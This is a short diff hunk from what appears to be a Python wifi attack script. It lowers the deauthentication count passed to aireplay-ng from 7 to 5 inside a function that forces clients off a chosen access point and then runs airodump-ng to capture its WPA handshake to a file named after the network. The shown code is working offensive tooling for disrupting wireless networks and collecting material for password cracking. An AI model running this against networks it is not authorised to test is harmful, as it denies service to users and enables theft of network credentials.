@@ -74,7 +74,7 @@ def handshake_check():
         target_ch=data_ch[NUM]
         target_ssid=data_networks[target_ap]
         os.system(f"iw dev wlan0mon set channel {target_ch}")
-        deauth=subprocess.Popen(['aireplay-ng','--deauth','7','-a',target_ap,'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
+        deauth=subprocess.Popen(['aireplay-ng','--deauth','5','-a',target_ap,'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
         stdout,stderr=deauth.communicate()
         h=subprocess.Popen(['airodump-ng','-c',str(target_ch),'--bssid',target_ap,'-w',target_ssid,'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE ,text=True)
         try:
